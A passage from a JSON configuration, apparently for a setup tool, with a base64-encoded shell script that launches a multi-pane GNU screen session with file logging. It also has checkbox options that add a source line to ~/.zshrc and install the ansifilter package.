ICBmaQoKICBsb2NhbCBfc2NyZWVucmM9JChjYXQgPDwgRU9GCiMgc3RhcnQgc2NyZWVuIGNvbmZpZwojIGVuYWJsZSBsb25nZXIgc2Nyb2xsYmFjawpkZWZzY3JvbGxiYWNrIDEwMDAwCgojIEJVRzogdGhpcyBkb2VzIGFsbG93IHJlZ2lvbiBzd2l0Y2hpbmcsIGJ1dCBraWxscyBzY3JvbGxpbmcgYWZ0ZXIgQ3RybCtFc2MgY29weSBtb2RlLCBhbmQgTU9VU0UgVEVYVCBTRUxFQ1RJT04gZmZzCiMgbW91c2UgdHJhY2tpbmcgYWxsb3dzIHRvIHN3aXRjaCByZWdpb24gZm9jdXMgYnkgY2xpY2tpbmcKI21vdXNldHJhY2sgb24KCiMgZ2l2ZSBhIHNlc3Npb24gbmFtZQpzZXNzaW9ubmFtZSBfX1NFU1NJT05fTkFNRV9fCgojIHR1cm4gb24gbG9nZ2luZyB0byBmaWxlcwpkZWZsb2cgb24KbG9nZmlsZSBzbG9nX19TRVNTSU9OX05BTUVfXy4lbgoKIyBhdHRlbXB0IHRvIHNhdmUgdGhlIHdpbmRvd3Mgd2hlbiBkZXRhY2hpbmcgdG8gYWxsb3cgcmVhdHRhY2hpbmcgaW4gdGhlIHNhbWUgdmlldwpsYXlvdXQgc2F2ZSBkZWZhdWx0CgojIGtleSBiaW5kaW5ncyAoY2FuIGFsc28gY3JlYXRlICdjb21tYW5kcycgdGhhdCBhcmUgdXNlZCB3aXRoaW4gdGhlIEN0cmwtYSA6IGlucHV0ISkKIyMgQ3RybC1TcGFjZSB0byBsaXN0IHdpbmRvd3MKYmluZGtleSBedCB3aW5kb3dsaXN0CiMjIHdpbmRvdyBmb2N1cyBtb3ZpbmcKYmluZCBoIGZvY3VzIGxlZnQKYmluZCBqIGZvY3VzIGRvd24KYmluZCBrIGZvY3VzIHVwCmJpbmQgbCBmb2N1cyByaWdodApiaW5kIHQgZm9jdXMgdG9wCmJpbmQgYiBmb2N1cyBib3R0b20KCiMgZGVmaW5lIHRoZSBkZWZhdWx0IHNjcmVlbiB3aW5kb3dzIHRvIG9wZW4gaGVyZToKIyB0b3AtbGVmdCBwYW5lCnNjcmVlbiAtdCBfX1NFU1NJT05fTkFNRV9fLndpbjAgMApzcGxpdApmb2N1cyBib3R0b20KcmVzaXplIC12IDQKZm9jdXMgdXAKCiMgdG9wLXJpZ2h0IHBhbmUKc3BsaXQgLXYKZm9jdXMgcmlnaHQKc2NyZWVuIC10IF9fU0VTU0lPTl9OQU1FX18ud2luMSAxCnNwbGl0CmZvY3VzIGRvd24Kc2NyZWVuIC10IF9fU0VTU0lPTl9OQU1FX18ud2luMiAyCnNwbGl0CmZvY3VzIGRvd24Kc2NyZWVuIC10IF9fU0VTU0lPTl9OQU1FX18ud2luMyAzCgoKIyBib3R0b20gcGFuZQpmb2N1cyBib3R0b20Kc2NyZWVuIC10IF9fU0VTU0lPTl9OQU1FX18ud2luNCA0CnNwbGl0IC12CmZvY3VzIHJpZ2h0CnNjcmVlbiAtdCBfX1NFU1NJT05fTkFNRV9fLndpbjUgNQpzcGxpdCAtdgpmb2N1cyByaWdodApzY3JlZW4gLXQgX19TRVNTSU9OX05BTUVfXy53aW42IDYKCiMgZm9jdXMgdG8gdGhlIGZpcnN0IHBhbmUKZm9jdXMgdG9wCmZvY3VzIGxlZnQKCiNlbmQgc2NyZWVuIGNvbmZpZwpFT0YKKQogIGxvY2FsIHNlc3NfbmFtZT0kMQogIGxvY2FsIHRlbXBfZmlsZT0kKG1rdGVtcCkKICAjIG91dHB1dCB0aGUgdGVtcG9yYXJ5IGZpbGUgb2YgdGhlIHNjcmVlbnJjIHZhcmlhYmxlIGFib3ZlLAogICMgcmVwbGFjaW5nIHRoZSBfX1NFU1NJT05fTkFNRV9fIHN0cmluZyB3aXRoIHRoZSBzdXBwbGllZCB2YWx1ZSBhcyB0aGUgZmlyc3QgYXJnCiAgZWNobyAiJF9zY3JlZW5yYyIgfCBzZWQgInMvX19TRVNTSU9OX05BTUVfXy8kc2Vzc19uYW1lL2ciID4gJHRlbXBfZmlsZQogIHNjcmVlbiAtYyAkdGVtcF9maWxlCiAgcm0gJHRlbXBfZmlsZQp9",
            "filename": "custom_screen_logging.sh",
            "sha256": "e21c0de1c90c862e38af38508a28072a8b48b990f795e0b3ed153f6c77a8f959"
          }
        ],
        "config": [
          {
            "help": "Enable the command to add some text to the ~/.zshrc file. Specifically a line to source the custom_screen_logging.sh file which contains the necessary functions and setup for adding a GNU screen logging setup to your machine.",
            "replace": "__CUSTOM_SCREEN_LOGGING_ZSHRC__",
            "defaultValue": true,
            "props": {
              "type": "checkbox",
              "label": "Add source line to ~/.zshrc file (only run this once!)",
              "replaceValue": "echo 'source ~/custom_screen_logging.sh' >> ~/.zshrc ;"
            }
          },
          {
            "help": "Enables the necessary command to install a package required for processing logs without having the ansi codes causing issues.",
            "replace": "__CUSTOM_SCREEN_LOGGING_APT_INSTALL__",
            "defaultValue": true,
            "props": {
              "type": "checkbox",
              "label": "Enable apt install ansifilter package for logs.py",
              "replaceValue": "sudo apt install ansifilter ;"
            }
          }
        ]
      }
    ]
  }
]
